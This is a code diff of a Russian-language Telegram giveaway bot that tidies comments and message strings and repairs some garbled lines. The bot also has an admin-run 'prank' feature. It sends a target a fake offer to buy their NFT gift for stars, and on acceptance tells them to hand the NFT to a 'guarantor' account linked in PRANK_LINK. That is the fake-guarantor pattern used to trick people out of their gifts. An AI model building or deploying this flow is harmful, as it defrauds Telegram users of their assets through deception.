@@ -10,7 +10,6 @@ from telegram.ext import Application, MessageHandler, filters, ContextTypes, Com
 from flask import Flask
 from threading import Thread
 
-# ================= НАСТРОЙКИ =================
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_ID = 5522110735  
 CHAT_MAIN = -1003797267456      
@@ -19,8 +18,7 @@ DEFAULT_WIN_CHANCE = 0.4
 DEFAULT_COOLDOWN = 60  
 DATA_FILE = "bot_data.json"
 DEFAULT_TIMER = 60
-PRANK_LINK = "https://t.me/xucosy" # ТВОЙ НИК ДЛЯ ПРАНКА
-# =============================================
+PRANK_LINK = "https://t.me/xucosy"
 
 logging.basicConfig(level=logging.INFO)
 
@@ -102,7 +100,7 @@ async def run_timer(chat_id, user_id, user_name, seconds, prize, context):
         except Exception: pass
         active_event = None 
     except asyncio.CancelledError: pass
-    except Exception as e: logging.error(f"Ошибка в таймере: {e}")
+    except Exception as e: logging.error(f"Ошибка: {e}")
 
 async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global current_timer_task, current_king_id, current_king_name, active_event, secret_number, current_prize
@@ -162,12 +160,7 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         data["cooldowns"] = cooldowns
         save_data(data)
         
-        text_win = (
-            f"🎊🎉 <b>ПОЗДРАВЛЯЮ!</b> 🎉🎊\n\n"
-            f"🧸 {user_link}, ты выиграл <b>мишку</b>!\n\n"
-            f"✅ Подарок отправится в течение 2 часов 🕒\n\n"
-            f"🚨 Пишите сообщения в чате, и получайте возможность так же залутать подарки!"
-        )
+        text_win = f"🎊🎉 <b>ПОЗДРАВЛЯЮ!</b> 🎉🎊\n\n🧸 {user_link}, ты выиграл <b>мишку</b>!\n\n✅ Подарок отправится в течение 2 часов 🕒"
         bear_photo = "https://i.postimg.cc/pXvngzR7/72BE0C1A-3E12-494D-895E-369895A4E8FF.png"
         try: msg = await update.message.reply_photo(photo=bear_photo, caption=text_win, parse_mode="HTML")
         except Exception: msg = await update.message.reply_text(text_win, parse_mode="HTML")
@@ -346,7 +339,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == 'back_to_menu':
         context.user_data['setup_step'] = None
         await query.edit_message_text(text=f"👑 <b>Админ-панель</b>\n\nВремя: <b>{data.get('timer')} сек.</b>\nШанс: <b>{data.get('win_chance')}%</b>\nКулдаун: <b>{data.get('cooldown')} мин.</b>", reply_markup=get_main_menu_keyboard(), parse_mode="HTML")
-
     elif query.data == 'prank_accept':
         await query.edit_message_caption(caption="✅ <b>Сделка инициирована!</b>\n\nПодарок зарезервирован. Чтобы получить оплату, отправьте ваш NFT нашему гаранту (нажмите кнопку ниже):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💎 Перейти к гаранту", url=PRANK_LINK)]]), parse_mode="HTML")
     elif query.data == 'prank_reject':
@@ -412,8 +404,6 @@ async def admin_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
         except: pass
         await update.message.reply_text("✅ Запущено!", reply_markup=get_main_menu_keyboard())
         return
-    
-    # НОВЫЕ ШАГИ ДЛЯ ПРАНКА
     elif step == 'prank_nft':
         context.user_data['prank_nft_name'] = text
         context.user_data['prank_photo'] = None 
@@ -448,12 +438,7 @@ async def cmd_send_offer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     price = context.user_data.get('prank_price', '200 ⭐')
     photo = context.user_data.get('prank_photo')
     
-    # Текст точь-в-точь как на скрине
-    text = (
-        f"<b>Пользователь {target_name} предлагает\n"
-        f"Вам {price} за подарок\n"
-        f"{nft}.</b>"
-    )
+    text = f"<b>Пользователь {target_name} предлагает\nВам {price} за подарок\n{nft}.</b>"
     
     keyboard = [[
         InlineKeyboardButton("❌ Отклонить", callback_data="prank_reject"),
@@ -471,9 +456,8 @@ async def cmd_send_offer(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Ошибка отправки: {e}")
 
 async def cmd_start_guess(update: Update, context: ContextTypes.DEFAULT_TYPE):
-   op if update.message.from_user.id != ADMIN))
-_ID or active   _event: return
-    context app.user_data['setup_step']_bot = 'guess_range'
+    if update.message.from_user.id != ADMIN_ID or active_event: return
+    context.user_data['setup_step'] = 'guess_range'
     await update.message.reply_text("🎯 Выбери диапазон:", reply_markup=get_range_keyboard())
 
 async def cmd_start_king(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -500,7 +484,8 @@ def main():
     app_bot.add_handler(CommandHandler("start", start_cmd))
     app_bot.add_handler(CommandHandler("startguess", cmd_start_guess))
     app_bot.add_handler(CommandHandler("startking", cmd_start_king))
-    app_bot.add_handler(CommandHandler("stop", cmd_st.add_handler(CommandHandler("stats", stats)) 
+    app_bot.add_handler(CommandHandler("stop", cmd_stop))
+    app_bot.add_handler(CommandHandler("stats", stats)) 
     app_bot.add_handler(CommandHandler("price", announce_price))
     app_bot.add_handler(CommandHandler("send_offer", cmd_send_offer))
     app_bot.add_handler(CallbackQueryHandler(button_handler, pattern="^(time_|setup_|range_|end_event|change_|show_commands|back_to_menu|prank_)"))
